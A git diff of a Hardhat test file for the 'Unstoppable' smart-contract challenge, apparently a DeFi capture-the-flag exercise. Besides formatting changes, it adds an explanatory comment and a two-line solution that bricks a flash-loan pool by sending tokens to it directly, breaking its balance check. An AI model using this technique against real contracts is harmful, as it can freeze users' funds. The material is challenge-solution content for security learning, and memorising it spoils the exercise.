@@ -1,5 +1,9 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {
+    ethers
+} = require('hardhat');
+const {
+    expect
+} = require('chai');
 
 describe('[Challenge] Unstoppable', function () {
     let deployer, attacker, someUser;
@@ -32,14 +36,28 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
-         // Show it's possible for someUser to take out a flash loan
-         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-         await this.receiverContract.executeFlashLoan(10);
+        // Show it's possible for someUser to take out a flash loan
+        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
+        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        await this.receiverContract.executeFlashLoan(10);
     });
 
+    /**
+     *  Overview of Exploit
+     * 
+     *  Since the lending pool requires
+     *         assert(poolBalance == balanceBefore);
+     *  Once is calculated at runtime with token.balanceOf() 
+     *  The other is stored and updated through the depositTokens() function
+     * 
+     *  Simply transferring tokens to the contract outside of that function
+     *  makes them out of sync and hence bricking the contract.
+     */
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        const attackTokenContract = this.token.connect(attacker);
+        await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
